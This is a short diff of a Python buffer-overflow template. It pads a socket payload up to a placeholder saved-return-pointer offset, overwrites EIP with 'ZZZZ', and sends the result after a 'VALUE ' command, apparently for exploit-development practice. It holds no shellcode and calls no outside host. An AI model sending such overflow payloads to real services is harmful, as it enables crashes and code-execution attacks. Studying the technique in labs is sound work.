@@ -19,14 +19,14 @@ offset_srp = OFFSET NUMBER
 
 buf = ""
 buf += "A"*(offset_srp - len(buf)) #padding
-buf += "ZZZZ"
+buf += "ZZZZ" #EIP should be 5A5A5A5A
 buf += "C"*(buf_totlen - len(buf)) #trailing padding
-buf += "\n"
+buf += "\r\n"
 
 #send the message
-s.send("VALUE" + buf)
+s.send("VALUE " + buf)
 
 #receive some data from socket
-data = s.recv(1024)
+s.recv(1024)
 
 s.close()
